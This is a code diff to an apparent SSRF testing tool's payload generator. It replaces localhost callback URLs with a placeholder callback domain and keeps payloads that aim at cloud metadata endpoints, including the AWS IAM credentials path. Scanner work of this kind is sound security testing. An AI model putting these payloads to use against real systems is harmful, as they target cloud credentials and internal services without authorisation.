@@ -92,10 +92,10 @@ class PayloadGenerator:
     # SSRF payloads - these will trigger callbacks to our detector
     SSRF_PAYLOADS = [
         # Internal services
-        "http://127.0.0.1:8000/ssrf/__TOKEN__",
-        "http://localhost:8000/ssrf/__TOKEN__",
-        "http://127.0.0.1:80/ssrf/__TOKEN__",
-        "http://localhost:80/ssrf/__TOKEN__",
+        "https://yourdomain.com/ssrf/__TOKEN__",
+        "http://yourdomain.com/ssrf/__TOKEN__",
+        "https://yourdomain.com/ssrf/__TOKEN__?redirect=1",
+        "http://yourdomain.com/ssrf/__TOKEN__?redirect=1",
         # Cloud metadata services
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "http://metadata.google.internal/computeMetadata/v1/",
